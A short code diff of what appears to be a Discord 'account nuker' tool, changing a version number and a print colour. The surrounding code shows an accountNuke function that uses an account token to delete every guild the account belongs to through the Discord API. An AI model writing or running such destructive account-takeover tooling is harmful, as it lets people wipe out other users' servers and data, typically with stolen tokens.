@@ -48,7 +48,7 @@ def clear():
 
 
 def search_for_updates():
-    THIS_VERSION = "1.5.1"
+    THIS_VERSION = "1.5.2"
 
     header = {
         "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.75 Safari/537.36",
@@ -180,7 +180,7 @@ def accountNuke(token):
     for guild in guildsIds:
         try:
             requests.delete(f'https://discord.com/api/v8/guilds/{guild}', headers=headers)
-            print(f'{Fore.LIGHT_EX}Deleted guild: {Fore.WHITE}{guild}.{Fore.RESET}')
+            print(f'{Fore.LIGHTRED_EX}Deleted guild: {Fore.WHITE}{guild}.{Fore.RESET}')
         except Exception as e:
             print(f"The following exception has been encountered and is being ignored: {e}")
 
